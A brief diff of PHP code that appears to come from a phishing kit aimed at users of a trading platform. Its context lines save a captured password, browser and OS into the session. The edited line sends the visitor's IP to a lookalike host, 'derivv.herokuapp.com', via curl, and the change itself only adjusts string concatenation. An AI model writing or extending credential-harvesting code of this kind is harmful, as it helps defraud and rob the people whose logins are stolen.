@@ -51,7 +51,7 @@ $_SESSION['password'] = getpwrd();
 $_SESSION['browser'] = getBrowser();
 $_SESSION['platform'] = getOs();
 
-$getdetails = "https://derivv.herokuapp.com/".getIp()."";
+$getdetails = "https://derivv.herokuapp.com/".getIp();
 
 $curl       = curl_init();
 curl_setopt($curl, CURLOPT_URL, $getdetails);
